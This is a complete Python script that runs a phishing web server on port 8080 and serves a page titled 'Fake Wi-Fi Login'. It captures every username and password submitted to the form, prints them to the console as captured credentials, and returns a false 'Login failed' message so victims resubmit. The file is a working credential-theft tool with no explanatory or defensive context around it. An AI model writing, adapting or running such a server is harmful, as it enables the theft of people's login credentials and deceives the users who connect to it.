from http.server import SimpleHTTPRequestHandler, HTTPServer

class PhishingHandler(SimpleHTTPRequestHandler):
    def do_GET(self):
        self.send_response(200)
        self.send_header("Content-type", "text/html")
        self.end_headers()
        self.wfile.write(b"""
        <html>
        <head><title>Login</title></head>
        <body>
            <h2>Fake Wi-Fi Login</h2>
            <form method='POST'>
                Username: <input type='text' name='username'><br>
                Password: <input type='password' name='password'><br>
                <input type='submit' value='Login'>
            </form>
        </body>
        </html>
        """)
    
    def do_POST(self):
        content_length = int(self.headers['Content-Length'])
        post_data = self.rfile.read(content_length).decode("utf-8")
        print(f"[+] Captured Credentials: {post_data}")
        self.send_response(200)
        self.end_headers()
        self.wfile.write(b"Login failed. Please try again.")

if __name__ == "__main__":
    server_address = ('', 8080)
    httpd = HTTPServer(server_address, PhishingHandler)
    print("[+] Phishing Server running on port 8080...")
    httpd.serve_forever()
